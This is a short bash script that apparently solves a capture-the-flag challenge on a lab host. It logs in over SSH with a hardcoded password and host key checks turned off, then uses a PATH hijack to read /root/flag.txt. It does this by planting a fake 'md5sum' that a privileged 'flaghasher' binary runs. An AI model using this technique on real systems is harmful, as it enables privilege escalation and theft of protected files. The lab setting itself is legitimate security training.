#!/bin/bash
export SSHPASS=9406837a
SSH="sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 13059 ctf-player@chatelaine.cylabacademy.net"
echo "=== 1) flaghasher seul ==="
$SSH 'flaghasher' 2>&1 | tail -6
echo "=== 2) bash explicite ==="
$SSH 'bash -c "id; echo PATH=\$PATH"' 2>&1 | tail -5
echo "=== 3) PATH hijack via bash ==="
$SSH 'bash -c "printf \"#!/bin/sh\ncat /root/flag.txt 2>/dev/null; id\n\" > \$HOME/md5sum; chmod +x \$HOME/md5sum; export PATH=\$HOME:\$PATH; flaghasher"' 2>&1 | tail -8
